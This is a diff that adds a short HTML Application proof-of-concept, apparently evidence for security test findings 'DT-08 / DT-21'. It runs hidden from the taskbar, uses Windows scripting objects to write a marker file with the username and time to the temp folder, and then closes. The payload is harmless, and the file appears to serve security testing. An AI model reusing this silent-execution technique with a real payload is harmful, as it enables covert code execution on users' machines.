@@ -1,0 +1,12 @@
+<hta:application id="poc" showintaskbar="no" windowstate="minimize" />
+<script>
+  var sh = new ActiveXObject("WScript.Shell");
+  var fso = new ActiveXObject("Scripting.FileSystemObject");
+  var p = sh.ExpandEnvironmentStrings("%TEMP%") + "\\DT08-PROOF.txt";
+  var f = fso.CreateTextFile(p, true);
+  f.WriteLine("DT-08 / DT-21 proof");
+  f.WriteLine("user: " + sh.ExpandEnvironmentStrings("%USERNAME%"));
+  f.WriteLine("time: " + new Date().toString());
+  f.Close();
+  close();
+</script>
